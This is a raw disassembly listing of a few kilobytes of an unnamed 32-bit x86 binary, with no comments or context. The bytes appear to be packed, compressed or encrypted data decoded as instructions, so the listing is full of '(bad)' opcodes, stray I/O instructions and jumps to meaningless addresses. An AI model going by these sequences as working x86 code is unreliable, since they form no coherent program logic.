  4827ad:	out    0xe0,eax
  4827af:	dec    eax
  4827b0:	aaa    
  4827b1:	xor    eax,0xfc56df4d
  4827b6:	sbb    ebx,ebp
  4827b8:	cmp    dh,BYTE PTR [ebp+0x38]
  4827bb:	(bad)  
  4827bc:	mov    ds:0xb7b5ce44,eax
  4827c1:	push   ds
  4827c2:	rcl    BYTE PTR [eax-0xc63c00],0x17
  4827c9:	jb     0x4827ec
  4827cb:	cmp    BYTE PTR ds:0x55a9e9c5,dh
  4827d1:	cmp    esi,DWORD PTR [eax+0x40]
  4827d4:	(bad)  
  4827d5:	sti    
  4827d6:	jmp    FWORD PTR [edi+0x3dc59dfa]
  4827dc:	mov    ds:0xdabab8e1,eax
  4827e1:	imul   ebp,DWORD PTR [edi],0x415b0d05
  4827e7:	sub    DWORD PTR [edi-0x10d069fb],0xaf3fd803
  4827f1:	(bad)  
  4827f2:	(bad)  
  4827f3:	cld    
  4827f4:	mov    eax,ds:0x8446d840
  4827f9:	dec    DWORD PTR [edi]
  4827fb:	pop    ss
  4827fc:	adc    al,0xc0
  4827fe:	and    al,0xf
  482800:	jl     0x482876
  482802:	dec    eax
  482803:	mov    ebp,0xaeb16d57
  482808:	pop    edx
  482809:	loopne 0x48280a
  48280b:	jmp    DWORD PTR [ebp-0xe]
  48280e:	(bad)  
  482810:	test   DWORD PTR [ebx+0x61],esi
  482813:	repz inc ebx
  482815:	(bad)  
  482816:	dec    ebx
  482817:	mov    edx,DWORD PTR [ebx]
  482819:	jp     0x4827fb
  48281b:	imul   esi,DWORD PTR [esi+edx*4+0x4a],0x29bc538f
  482823:	adc    BYTE PTR [esi+0x2],cl
  482826:	or     DWORD PTR [eax],ecx
  482828:	pop    es
  482829:	jg     0x4827d3
  48282b:	sbb    BYTE PTR [esi+0x6f],dl
  48282e:	mov    ds:0x74616c46,eax
  482833:	push   ebx
  482834:	arpl   WORD PTR [edi],ax
  482836:	adc    esi,DWORD PTR [ebx]
  482838:	cld    
  482839:	jb     0x4828aa
  48283b:	ins    BYTE PTR es:[edi],dx
  48283c:	ins    BYTE PTR es:[edi],dx
  48283d:	inc    edx
  48283e:	popa   
  48283f:	call   0x4121:0xe312e31b
  482846:	lods   eax,DWORD PTR ds:[esi]
  482847:	xchg   DWORD PTR [eax-0x41],ecx
  48284a:	(bad)  
  48284b:	jmp    esp
  48284d:	jns    0x4827fd
  48284f:	mov    edi,0x853b2518
  482854:	cmp    al,0x4
  482856:	stc    
  482857:	repnz idiv dl
  48285a:	pop    ss
  48285b:	sti    
  48285c:	neg    BYTE PTR [edx]
  48285e:	adc    BYTE PTR [ebx+0x2f2b8ac9],ah
  482864:	dec    ecx
  482865:	sti    
  482866:	xchg   DWORD PTR [edi],ebx
  482868:	ret    0x3039
  48286b:	or     ah,dh
  48286d:	adc    edi,edi
  48286f:	call   FWORD PTR [edi]
  482871:	jns    0x482841
  482873:	jle    0x482807
  482875:	cld    
  482876:	cdq    
  482877:	adc    cl,dl
  482879:	cli    
  48287a:	push   ss
  48287b:	inc    edx
  48287c:	adc    DWORD PTR [ebx],0x7adec44a
  482882:	cmp    al,0x7b
  482884:	bound  edi,QWORD PTR [eax-0x6]
  482887:	das    
  482888:	mov    ebp,0xf2fff87c
  48288d:	das    
  48288e:	ins    DWORD PTR es:[edi],dx
  48288f:	dec    eax
  482890:	call   0x680c:0x2173f494
  482897:	sub    edi,edi
  482899:	mov    esi,0xcff9e6f8
  48289e:	(bad)  
  48289f:	(bad)  
  4828a0:	call   FWORD PTR [edi]
  4828a2:	aam    0x20
  4828a4:	ins    BYTE PTR es:[edi],dx
  4828a5:	out    dx,al
  4828a6:	inc    ebx
  4828a7:	add    bl,BYTE PTR [edx-0x2a]
  4828aa:	inc    eax
  4828ab:	mov    cl,0x3f
  4828ad:	out    0x6a,al
  4828af:	js     0x482853
  4828b1:	pop    ss
  4828b2:	leave  
  4828b3:	jno    0x4828ab
  4828b5:	mov    WORD PTR [edi+eax*8+0x17],gs
  4828b9:	mov    ebx,0x83278f44
  4828be:	mov    eax,ds:0xa9fa5ee0
  4828c3:	xor    BYTE PTR [edx+0x1e],0x97
  4828c7:	das    
  4828c8:	or     edx,DWORD PTR [edi+0x20]
  4828cb:	addr16 cmp al,0xbc
  4828ce:	xchg   DWORD PTR [ebx+0x2a439a32],eax
  4828d4:	inc    ebx
  4828d5:	push   cs
  4828d6:	xor    bl,BYTE PTR [edi+0x383bcb9d]
  4828dc:	stos   DWORD PTR es:[edi],eax
  4828dd:	ret    0x3112
  4828e0:	inc    edx
  4828e1:	xlat   BYTE PTR ds:[ebx]
  4828e2:	xchg   esi,eax
  4828e3:	imul   ebx,DWORD PTR [edx]
  4828e6:	xor    eax,DWORD PTR [edx+0x39]
  4828e9:	lahf   
  4828ea:	cmp    BYTE PTR [esi+0x42],dl
  4828ed:	push   es
  4828ee:	xchg   BYTE PTR [edi],bh
  4828f0:	pop    esp
  4828f1:	mov    ebx,0x462a5a46
  4828f6:	push   ss
  4828f7:	and    BYTE PTR [esp+ebp*2+0x67],0x33
  4828fc:	sahf   
  4828fd:	add    eax,0x6fe46d78
  482902:	arpl   WORD PTR [eax+0x44],di
  482905:	sbb    al,0x2e
  482907:	or     al,0x6d
  482909:	push   edx
  48290a:	inc    esp
  48290b:	add    bl,BYTE PTR [esp+ebp*8]
  48290e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48290f:	imul   ebx,DWORD PTR [eax],0x1900676f
  482915:	rcr    BYTE PTR [edi-0x1f],0xf3
  482919:	sbb    ch,BYTE PTR ds:0x8806301f
  48291f:	xor    al,BYTE PTR [edx]
  482921:	inc    edi
  482922:	mov    esi,0x7a8fa617
  482927:	push   es
  482928:	push   ds
  482929:	lods   eax,DWORD PTR ds:[esi]
  48292a:	add    ah,BYTE PTR [ebx+ebx*4-0x1c]
  48292e:	inc    edx
  48292f:	(bad)  
  482930:	dec    ebp
  482932:	push   cs
  482933:	stos   BYTE PTR es:[edi],al
  482934:	and    edx,eax
  482936:	adc    DWORD PTR [ebx-0x365fffaf],esi
  48293c:	add    eax,0x62638e5d
  482941:	(bad)  
  482942:	(bad)  
  482943:	jmp    FWORD PTR [edi]
  482945:	mov    ebx,0x354ea9d7
  48294a:	adc    DWORD PTR ds:0x19ef9e48,edi
  482950:	cmp    BYTE PTR [esi-0x13],cl
  482953:	call   0xca1c:0xf5e6b277
  48295a:	out    dx,al
  48295b:	fimul  WORD PTR [ebp-0x78]
  48295e:	inc    eax
  48295f:	add    eax,0x38fc2e04
  482964:	pop    es
  482965:	sbb    DWORD PTR [esi+0x7fdf773b],ecx
  48296b:	aad    0xff
  48296d:	jg     0x48299d
  48296f:	mov    esi,0x9918d19
  482974:	cwde   
  482975:	inc    esi
  482976:	xchg   ebp,ebp
  482978:	test   DWORD PTR [edi-0x33c13a8c],esp
  48297e:	test   BYTE PTR [eiz*2+0x43df2b9b],0xba
  482986:	or     DWORD PTR [eax],esi
  482988:	pop    ss
  482989:	(bad)  
  48298a:	mov    bh,0xa5
  48298c:	fmul   DWORD PTR [ebx-0x6b]
  48298f:	sbb    esp,esp
  482991:	fistp  QWORD PTR [eax]
  482993:	pop    edi
  482994:	add    ch,BYTE PTR [eax+ecx*2]
  482997:	sahf   
  482998:	push   ss
  482999:	add    eax,0x8bcb9e47
  48299e:	lods   eax,DWORD PTR ds:[esi]
  48299f:	or     eax,0x5b5b0b54
  4829a4:	jns    0x482944
  4829a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4829a7:	add    DWORD PTR [edi],edi
  4829a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4829aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4829ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4829ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4829ad:	dec    esi
  4829ae:	sahf   
  4829af:	mov    ds:0x4606450b,eax
  4829b4:	inc    edi
  4829b5:	dec    ecx
  4829b6:	add    al,0x38
  4829b8:	iret   
  4829b9:	repz push es
  4829bb:	dec    edx
  4829bc:	mov    WORD PTR [ebp+0x6b84bb7f],cs
  4829c2:	inc    ebx
  4829c3:	xchg   edx,eax
  4829c4:	fild   WORD PTR [ebx]
  4829c6:	push   ds
  4829c7:	sbb    BYTE PTR [eax+0x4f],al
  4829ca:	repz mov dh,0xe4
  4829cd:	fild   WORD PTR [ebx]
  4829cf:	or     DWORD PTR [edi],ebp
  4829d1:	call   0x114635bb
  4829d6:	pusha  
  4829d7:	pop    ss
  4829d8:	jbe    0x4829b0
  4829da:	das    
  4829db:	pop    ds
  4829dc:	adc    BYTE PTR [edx],dl
  4829de:	fidiv  WORD PTR [ebp-0x49]
  4829e1:	out    0x4b,al
  4829e3:	(bad)  
  4829e4:	dec    esp
  4829e5:	or     DWORD PTR [edi],ebp
  4829e7:	sbb    cl,BYTE PTR [ecx]
  4829e9:	out    0xe1,al
  4829eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4829ec:	pop    esp
  4829ed:	fwait
  4829ee:	pop    edi
  4829ef:	xchg   BYTE PTR [edi+0x1462f21],bh
  4829f5:	(bad)  
  4829f6:	ins    DWORD PTR es:[edi],dx
  4829f7:	adc    al,BYTE PTR [eax+0x11646ea8]
  4829fd:	dec    eax
  4829fe:	gs popa 
  482a00:	fs js  0x4829e2
  482a03:	(bad)  
  482a05:	inc    BYTE PTR [ebp+0x6e]
  482a08:	popa   
  482a09:	bound  ebp,QWORD PTR [ebp+eiz*2+0x24]
  482a0d:	inc    esp
  482a0e:	jmp    0x6372:0x756f5361
  482a15:	gs adc eax,0x57ced14d
  482a1b:	out    dx,eax
  482a1c:	gs ins DWORD PTR es:[edi],dx
  482a1e:	bound  edi,QWORD PTR [edx]
  482a20:	xor    DWORD PTR [esi+0x2440033],eax
  482a26:	xor    bh,BYTE PTR [edx]
  482a28:	mov    ds:0x2dfefcba,eax
  482a2d:	add    BYTE PTR [ebx],dh
  482a2f:	xor    dh,bl
  482a31:	sub    eax,0x2b2eab45
  482a36:	inc    ecx
  482a37:	rep outs dx,BYTE PTR ds:[esi]
  482a39:	xor    ah,bh
  482a3b:	stos   DWORD PTR es:[edi],eax
  482a3c:	cmp    ebx,DWORD PTR [edx]
  482a3e:	push   0x4b
  482a40:	jbe    0x482a34
  482a42:	dec    eax
  482a43:	inc    esi
  482a44:	dec    esp
  482a45:	pop    eax
  482a46:	inc    edi
  482a47:	inc    esp
  482a48:	lods   eax,DWORD PTR ds:[esi]
  482a49:	call   0x6990c924
  482a4e:	mov    dh,0x61
  482a50:	aam    0x68
  482a52:	imul   esp,DWORD PTR [ebx+0x2e],0x678fa46
  482a59:	jbe    0x482ace
  482a5b:	inc    DWORD PTR [edi+0x72]
  482a5e:	imul   esp,DWORD PTR [esp+ecx*2+0x69],0x1d4d2e62
  482a66:	add    BYTE PTR [edi],dl
  482a68:	jmp    0x5853be0
  482a6d:	retf   0x3806
  482a70:	jg     0x482a8a
  482a72:	sahf   
  482a73:	dec    ecx
  482a74:	ds iret 
  482a76:	and    BYTE PTR [eax-0x42],bl
  482a79:	add    DWORD PTR [esi],eax
  482a7b:	adc    ebx,DWORD PTR ds:0x2a793fcd
  482a81:	sbb    edx,esi
  482a83:	shl    al,cl
  482a85:	mov    al,0xcc
  482a87:	mov    ds:0x217faa74,eax
  482a8c:	pop    ss
  482a8d:	sti    
  482a8e:	add    BYTE PTR [eax-0x75],ch
  482a91:	adc    BYTE PTR [eax],bl
  482a93:	pop    ds
  482a94:	pop    ss
  482a95:	inc    esi
  482a96:	(bad)  
  482a97:	or     BYTE PTR [edi],ah
  482a99:	shl    ecx,0xff
  482a9c:	(bad)  
  482a9d:	jmp    DWORD PTR [eax-0x6f78bffe]
  482aa3:	add    bh,bh
  482aa5:	mov    DWORD PTR [ebx],esi
  482aa7:	add    al,0x17
  482aa9:	push   ss
  482aaa:	setp   BYTE PTR [edx]
  482aad:	inc    ebx
  482aae:	ucomiss xmm0,DWORD PTR [ecx-0x52]
  482ab2:	lds    esp,FWORD PTR [ebx+0x1a]
  482ab5:	bound  ecx,QWORD PTR [edx+0x3c]
  482ab8:	xor    eax,0x317fffff
  482abd:	fbld   TBYTE PTR [eax]
  482abf:	imul   ebp,DWORD PTR [ecx-0x6b0b961c],0xf0febb4f
  482ac9:	je     0x482a72
  482acb:	push   esp
  482acc:	cmp    ecx,ebp
  482ace:	pop    edi
  482acf:	inc    edx
  482ad0:	push   0xd21c7ced
  482ad5:	call   0x4e63c4d9
  482ada:	mov    eax,0x326e35ae
  482adf:	pop    ebx
  482ae0:	mov    esp,0xe767ffa
  482ae5:	sub    al,0x1c
  482ae7:	add    edx,esi
  482ae9:	add    eax,DWORD PTR [ecx+edx*2]
  482aec:	test   al,0xc8
  482aee:	ins    DWORD PTR es:[edi],dx
  482aef:	lahf   
  482af0:	or     cl,BYTE PTR [esi]
  482af2:	pop    es
  482af3:	pop    edi
  482af4:	pop    ds
  482af5:	iret   
  482af6:	leave  
  482af7:	(bad)  
  482af8:	adc    BYTE PTR [edx],al
  482afa:	pop    esi
  482afb:	push   es
  482afc:	or     BYTE PTR [eax-0x25],cl
  482aff:	test   DWORD PTR [esp+edi*1+0xa],edi
  482b03:	mov    esi,0x702f6068
  482b08:	fsubr  QWORD PTR [esi]
  482b0a:	mov    fs,WORD PTR [edi-0x41]
  482b0d:	js     0x482b3e
  482b0f:	inc    edx
  482b10:	jle    0x482aee
  482b12:	mov    gs,WORD PTR [edi+0x6654b8e8]
  482b18:	je     0x482b1a
  482b1a:	push   edx
  482b1b:	outs   dx,DWORD PTR ds:[esi]
  482b1c:	ja     0x482ab7
  482b1e:	adc    ch,bh
  482b20:	mov    DWORD PTR [edi],0x33029776
  482b26:	jg     0x482b58
  482b28:	add    eax,DWORD PTR [eax]
  482b2a:	jae    0x482ae8
  482b2c:	out    0x2d,eax
  482b2e:	add    BYTE PTR [ebx+0x42],al
  482b31:	adc    edx,DWORD PTR [edi-0x71c425d0]
  482b37:	mov    dh,0xeb
  482b39:	push   ss
  482b3a:	ss xchg edi,eax
  482b3c:	inc    ecx
  482b3d:	nop    DWORD PTR [eax]
  482b40:	jmp    ebx
  482b42:	add    BYTE PTR [edi],0xbe
  482b45:	cmp    dl,BYTE PTR [esi+0x4c544144]
  482b4b:	push   ebx
  482b4c:	push   esp
  482b4d:	push   ds
  482b4e:	cmp    ecx,DWORD PTR [esi+eiz*1+0x7473765b]
  482b55:	jg     0x482b3a
  482b57:	xlat   BYTE PTR ds:[ebx]
  482b58:	mov    cl,0x61
  482b5a:	pop    ss
  482b5b:	add    BYTE PTR [ecx],dl
  482b5d:	and    edi,DWORD PTR [esi-0x6d18bfdd]
  482b63:	out    0x82,eax
  482b65:	outs   dx,DWORD PTR ds:[esi]
  482b66:	pusha  
  482b67:	(bad)  
  482b68:	push   cs
  482b69:	in     al,0x42
  482b6b:	dec    esi
  482b6c:	sahf   
  482b6d:	sbb    esi,DWORD PTR [ebx]
  482b6f:	sbb    al,0x1b
  482b71:	(bad)  
  482b72:	inc    DWORD PTR [edx+0x2e]
  482b75:	sbb    bh,BYTE PTR [ecx-0x3593b072]
  482b7b:	sbb    ebx,0x49
  482b7e:	lea    ebx,[esi-0x7b97873e]
  482b84:	bswap  ecx
  482b86:	(bad)  
  482b87:	inc    ecx
  482b89:	sbb    BYTE PTR [edi],bl
  482b8b:	jge    0x482bb1
  482b8d:	cmp    DWORD PTR [edx],esi
  482b8f:	stos   BYTE PTR es:[edi],al
  482b90:	cs inc esp
  482b92:	xchg   ecx,eax
  482b93:	cmc    
  482b94:	jb     0x482bb2
  482b96:	adc    al,0xb5
  482b98:	sub    eax,0xf2c5627c
  482b9d:	stc    
  482b9e:	(bad)  
  482b9f:	(bad)  
  482ba0:	dec    DWORD PTR [ecx]
  482ba2:	loope  0x482b4e
  482ba4:	xchg   edi,eax
  482ba5:	dec    edx
  482ba6:	xchg   esi,eax
  482ba7:	retf   0xdf2a
  482baa:	sbb    ecx,DWORD PTR [ecx-0x6e]
  482bad:	sbb    BYTE PTR [esi],dh
  482baf:	mov    ss,ebp
  482bb1:	mov    BYTE PTR [esi],bh
  482bb3:	push   ebp
  482bb4:	mov    eax,DWORD PTR [ebp-0x65]
  482bb7:	cdq    
  482bb8:	lahf   
  482bb9:	xchg   ebp,eax
  482bba:	cmp    al,0x86
  482bbc:	stos   DWORD PTR es:[edi],eax
  482bbd:	xchg   ecx,eax
  482bbe:	(bad)  [eax]
  482bc0:	nop
  482bc1:	or     DWORD PTR [edi],ecx
  482bc3:	push   es
  482bc4:	ds adc bh,al
  482bc7:	sub    dh,BYTE PTR [ecx+0x6f0f4234]
  482bcd:	mov    esp,0x100c022
  482bd2:	xchg   edi,eax
  482bd3:	test   BYTE PTR [eax],dl
  482bd5:	enter  0x3205,0x75
  482bd9:	jg     0x482b9b
  482bdb:	fsub   DWORD PTR [ecx]
  482bdd:	adc    BYTE PTR [eax],ah
  482bdf:	pop    ss
  482be0:	lock xlat BYTE PTR cs:[ebx]
  482be3:	imul   esi,DWORD PTR [edi],0x6f6262
  482be9:	adc    esp,DWORD PTR [ebp+0x11]
  482bec:	mov    esi,0x92ee1fef
  482bf1:	sub    esp,ebx
  482bf3:	sub    ecx,DWORD PTR [edi+0x7e]
  482bf6:	dec    ebp
  482bf7:	sti    
  482bf8:	xchg   bh,bh
  482bfa:	daa    
  482bfb:	xchg   esi,eax
  482bfc:	gs sti 
  482bfe:	push   ds
  482bff:	jl     0x482b86
  482c01:	rcl    DWORD PTR [ecx],1
  482c03:	mov    cl,0x6a
  482c05:	and    al,0xf0
  482c07:	sub    BYTE PTR [esi],dh
  482c09:	sub    BYTE PTR [ebp+0x217fff1f],dl
  482c0f:	pop    ss
  482c10:	xchg   esp,eax
  482c11:	mov    DWORD PTR [ebp+0x71469534],edx
  482c17:	icebp  
  482c18:	dec    edx
  482c19:	or     BYTE PTR [ebx],0xf1
  482c1c:	out    0x67,eax
  482c1e:	xor    ecx,esp
  482c20:	(bad)  
  482c21:	jmp    DWORD PTR [edi+eax*2+0x129c0a18]
  482c28:	dec    esi
  482c29:	jl     0x482c03
  482c2b:	mov    ds:0x9a9cb845,al
  482c30:	push   edx
  482c31:	nop
  482c32:	dec    esi
  482c33:	data16 shr BYTE PTR [edi-0x1],1
  482c37:	(bad)  
  482c38:	(bad)  
  482c39:	jg     0x482c32
  482c3b:	mov    al,ds:0xa83f5a48
  482c40:	dec    ebx
  482c41:	dec    ecx
  482c42:	xchg   ecx,eax
  482c43:	gs lock dec ecx
  482c46:	xlat   BYTE PTR ds:[ebx]
  482c47:	fisubr WORD PTR [eax+0x33]
  482c4a:	xchg   edx,eax
  482c4b:	sub    DWORD PTR [edi-0x7f5aaa66],edx
  482c51:	dec    esi
  482c52:	xchg   esi,eax
  482c53:	and    al,0x10
  482c55:	cld    
  482c56:	test   BYTE PTR [esi+ebp*4+0x55],ah
  482c5a:	jmp    0x4f8ba2fd
  482c5f:	out    dx,eax
  482c60:	add    al,0xee
  482c62:	add    bh,al
  482c64:	cmp    BYTE PTR [ebx+0x7c],0x12
  482c68:	or     eax,DWORD PTR [ebp+eax*1+0x1282dd1d]
  482c6f:	pop    es
  482c70:	test   al,0x77
  482c72:	pop    esp
  482c73:	(bad)  
  482c74:	enter  0xaf45,0x50
  482c78:	adc    BYTE PTR [edi],bh
  482c7a:	or     esi,DWORD PTR [edx+0x21]
  482c7d:	scas   eax,DWORD PTR es:[edi]
  482c7e:	stc    
  482c7f:	or     bh,ah
  482c81:	or     al,0x2e
  482c83:	adc    DWORD PTR [eax],esp
  482c85:	cmp    BYTE PTR [ebx],0x17
  482c88:	jb     0x482c9d
  482c8a:	cmp    BYTE PTR [edi],cl
  482c8c:	std    
  482c8d:	sbb    eax,0x48b72fff
  482c92:	outs   dx,DWORD PTR ds:[esi]
  482c93:	je     0x482ce9
  482c95:	jb     0x482cf8
  482c97:	arpl   WORD PTR [ebx+0x69],bp
  482c9a:	outs   dx,BYTE PTR ds:[esi]
  482c9b:	repnz dec ebp
  482c9d:	jne    0x482d0b
  482c9f:	je     0x482d0a
  482ca1:	push   ebx
  482ca2:	or     BYTE PTR gs:[edi-0x65],ch
  482ca6:	mov    ds:0xcca632c,eax
  482cab:	jo     0x482d0e
  482cad:	cs je  0x482d1f
  482cb0:	jb     0x482d25
  482cb2:	sbb    BYTE PTR [ebp+0x335ca3f1],cl
  482cb8:	dec    ecx
  482cb9:	xor    bl,cl
  482cbb:	inc    ebp
  482cbc:	and    DWORD PTR [edi],eax
  482cbe:	and    al,0xdf
  482cc0:	lds    esi,FWORD PTR ds:0x45004600
  482cc6:	dec    esp
  482cc7:	test   BYTE PTR [ebx],0x7a
  482cca:	mov    ah,0xce
  482ccc:	ins    BYTE PTR es:[edi],dx
  482ccd:	mov    ch,0x54
  482ccf:	adc    al,0x53
  482cd1:	je     0x482d45
  482cd3:	imul   esi,DWORD PTR [eax+0x0],0x115c911
  482cda:	ds mov esi,0xa42f1813
  482ce0:	bnd ja 0x482c9f
  482ce3:	ja     0x482cd1
  482ce5:	push   ss
  482ce6:	stc    
  482ce7:	push   es
  482ce8:	or     eax,0x833fe6af
  482ced:	cmp    WORD PTR [edi-0x1aa27470],0x1f
  482cf5:	in     al,0x61
  482cf7:	and    al,0x85
  482cf9:	out    dx,eax
  482cfa:	icebp  
  482cfb:	(bad)  
  482cfc:	(bad)  
  482cfd:	call   edi
  482cff:	ss mov ecx,0x4ce1a649
  482d05:	jno    0x482cb0
  482d07:	xchg   ebx,eax
  482d08:	out    0x7e,al
  482d0a:	pop    edx
  482d0b:	fisttp WORD PTR [esi-0x1c3265a3]
  482d11:	dec    esp
  482d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  482d13:	xor    eax,edi
  482d15:	lahf   
  482d16:	adc    eax,0xffffff83
  482d19:	scas   al,BYTE PTR es:[edi]
  482d1a:	(bad)  
  482d1b:	push   DWORD PTR [edi-0x46]
  482d1e:	outs   dx,DWORD PTR ds:[esi]
  482d1f:	out    0xf,eax
  482d21:	push   ss
  482d22:	pop    edi
  482d23:	cli    
  482d24:	int    0xab
  482d26:	mov    ebp,0x974f523c
  482d2b:	icebp  
  482d2c:	jle    0x482d7c
  482d2e:	cdq    
  482d2f:	xor    al,0xa3
  482d31:	push   ebx
  482d32:	repnz push edx
  482d34:	(bad)  
  482d35:	inc    DWORD PTR [edi-0x59]
  482d38:	mov    ebx,0x2d99a223
  482d3d:	inc    esi
  482d3e:	xchg   esi,eax
  482d3f:	push   ecx
  482d40:	stos   DWORD PTR es:[edi],eax
  482d41:	repnz rcr BYTE PTR [ecx-0x3f],1
  482d45:	adc    eax,0xb7d3e6fe
  482d4a:	push   ebp
  482d4b:	dec    ecx
  482d4c:	jae    0x482d5d
  482d4e:	add    al,BYTE PTR [edi]
  482d50:	(bad)  
  482d51:	(bad)  
  482d52:	fstp   QWORD PTR [eax-0x66]
  482d55:	adc    al,0xda
  482d57:	jmp    FWORD PTR [eax+0x88a50a7]
  482d5d:	pop    ss
  482d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  482d5f:	xchg   edi,eax
  482d60:	sahf   
  482d61:	dec    esp
  482d62:	sbb    eax,0x151cc7ef
  482d67:	mov    edi,0x97fe0890
  482d6c:	cmp    al,0x1f
  482d6e:	shr    DWORD PTR [edi],cl
  482d70:	sbb    eax,0x420c505e
  482d75:	mov    al,0xa
  482d77:	and    ebx,DWORD PTR [edx+eiz*1]
  482d7a:	xor    al,0x4a
  482d7c:	jns    0x482d96
  482d7e:	or     esp,esi
  482d80:	stos   DWORD PTR es:[edi],eax
  482d81:	loop   0x482db4
  482d83:	outs   dx,DWORD PTR ds:[esi]
  482d84:	outs   dx,DWORD PTR ds:[esi]
  482d85:	ins    BYTE PTR es:[edi],dx
  482d86:	(bad)  
  482d88:	adc    bl,BYTE PTR [ebx+ecx*1]
  482d8b:	xchg   BYTE PTR [edi],cl
  482d8d:	aad    0x70
  482d8f:	rol    BYTE PTR [ecx],1
  482d91:	das    
  482d92:	sahf   
  482d93:	jmp    0x482d85
  482d95:	adc    al,0x5f
  482d97:	das    
  482d98:	mov    al,ds:0x7f1576ad
  482d9d:	bnd ss ret 
  482da0:	mov    ds:0x868e3867,eax
  482da5:	out    dx,eax
  482da6:	mov    ds:0x42ffff1f,al
  482dab:	mov    eax,cs:0xd2daaff1
  482db1:	das    
  482db2:	fisub  DWORD PTR ds:0x436db744
  482db8:	mov    ebp,0xc7068ef3
  482dbd:	(bad)  
  482dbe:	(bad)  
  482dbf:	ds ret 
  482dc1:	push   0x7b
  482dc3:	sar    DWORD PTR [ecx],0xad
  482dc6:	repz or al,0x4b
  482dc9:	test   eax,0x70cd5102
  482dce:	(bad)  
  482dcf:	mov    bh,0x53
  482dd1:	das    
  482dd2:	(bad)  
  482dd3:	(bad)  
  482dd4:	call   FWORD PTR [edi]
  482dd6:	mov    al,0xfe
  482dd8:	mov    eax,ds:0xb92249d5
  482ddd:	sbb    al,0x44
  482ddf:	test   al,0x6c
  482de1:	out    0xe4,al
  482de3:	jmp    0xad8a2373
  482de8:	icebp  
  482de9:	jbe    0x482e65
  482deb:	pusha  
  482dec:	jns    0x482dba
  482dee:	dec    edx
  482def:	xchg   ebp,eax
  482df0:	inc    esp
  482df1:	cmp    DWORD PTR [ecx+0x1],edi
  482df4:	cld    
  482df5:	mov    ebp,DWORD PTR [edx+0x1f]
  482df8:	sbb    eax,DWORD PTR [esi-0xf]
  482dfb:	scas   al,BYTE PTR es:[edi]
  482dfc:	out    0x53,al
  482dfe:	or     eax,0x2ab6f232
  482e03:	pop    es
  482e04:	jmp    0xc708:0xe063f216
  482e0b:	das    
  482e0c:	daa    
  482e0d:	test   al,0xa2
  482e0f:	jo     0x482dfb
  482e11:	mov    ds:0x97882c2f,al
  482e16:	dec    eax
  482e17:	mov    ebx,0x9a64a31c
  482e1c:	jne    0x482e91
  482e1e:	inc    eax
  482e1f:	adc    eax,0x136eda70
  482e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  482e25:	pop    ss
  482e26:	dec    edi
  482e27:	xchg   ebx,eax
  482e28:	neg    DWORD PTR [ebp+eax*8+0x40]
  482e2c:	lahf   
  482e2d:	mov    BYTE PTR [ebp-0x4e8d52ca],dl
  482e33:	stos   DWORD PTR es:[edi],eax
  482e34:	clc    
  482e35:	and    bh,BYTE PTR [edx]
  482e37:	add    eax,0x215f8935
  482e3c:	pop    ds
  482e3d:	and    bh,bh
  482e3f:	(bad)  
  482e40:	call   DWORD PTR [edi]
  482e42:	jmp    0xad9b7f81
  482e47:	dec    edi
  482e48:	mov    bl,0x40
  482e4a:	lahf   
  482e4b:	sub    eax,0xc2e5de9a
  482e50:	(bad)  
  482e52:	(bad)  
  482e53:	pop    ebp
  482e54:	jne    0x482dd8
  482e56:	inc    ebp
  482e57:	outs   dx,DWORD PTR ds:[esi]
  482e58:	or     BYTE PTR [ebx-0x66],0xff
  482e5c:	pop    ds
  482e5d:	sub    bh,dh
  482e5f:	adc    bl,BYTE PTR ds:0xe26ea9a7
  482e65:	jb     0x482e06
  482e67:	xchg   ecx,eax
  482e68:	je     0x482e4f
  482e6a:	imul   ebx,edx,0x44
  482e6d:	std    
  482e6e:	dec    esp
  482e6f:	cdq    
  482e70:	mov    esi,DWORD PTR [eax+0x2]
  482e73:	adc    esi,edx
  482e75:	(bad)  
  482e76:	(bad)  
  482e77:	mov    ebp,0x876050cc
  482e7c:	mov    dl,0xbf
  482e7e:	inc    esi
  482e7f:	jnp    0x482edf
  482e81:	add    eax,0x182e9542
  482e86:	ins    BYTE PTR es:[edi],dx
  482e87:	sbb    DWORD PTR [edx+0x70a385a],eax
  482e8d:	sub    BYTE PTR [esi+0x21],al
  482e90:	xchg   edi,eax
  482e91:	mov    ah,0x18
  482e93:	mov    dl,BYTE PTR [eax-0x1f]
  482e96:	jbe    0x482ea3
  482e98:	mov    edx,0x777f0718
  482e9d:	jg     0x482ef3
  482e9f:	adc    al,0x21
  482ea1:	outs   dx,DWORD PTR ds:[esi]
  482ea2:	push   eax
  482ea3:	jb     0x482f14
  482ea5:	addr16 jb 0x482e95
  482ea8:	push   ds
  482ea9:	fadd   st,st(5)
  482eab:	gs jae 0x482f0d
  482eae:	pop    ss
  482eaf:	popa   
  482eb0:	sbb    DWORD PTR [eax],eax
  482eb2:	pop    es
  482eb3:	lock add DWORD PTR ds:0xcf6aac53,esp
  482eba:	jg     0x482f34
  482ebc:	adc    al,0x3f
  482ebe:	jns    0x482e8f
  482ec0:	ror    ch,0x36
  482ec3:	loop   0x482e7b
  482ec5:	nop
  482ec6:	inc    ecx
  482ec7:	(bad)  
  482ec8:	aas    
  482ec9:	mov    edi,0xb50d8b90
  482ece:	pop    ds
  482ecf:	mov    ah,0xda
  482ed1:	sub    BYTE PTR [ebp-0xf8c],0xff
  482ed8:	retf   0x7c11
  482edb:	dec    edi
  482edc:	pushf  
  482edd:	(bad)  
  482ede:	data16 add al,0xdc
  482ee1:	push   esi
  482ee2:	xor    ebp,DWORD PTR [esi+0x29]
  482ee5:	adc    esp,ebx
  482ee7:	push   es
  482ee8:	sub    bh,BYTE PTR [edx-0x945ba1e]
  482eee:	dec    esi
  482eef:	mov    al,ds:0x6c815a3e
  482ef4:	(bad)  
  482ef5:	call   DWORD PTR [edi]
  482ef7:	adc    eax,0xe2e3c44f
  482efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  482efd:	mov    al,0xe1
  482eff:	call   0x4794:0x816cbf46
  482f06:	jmp    0x482e97
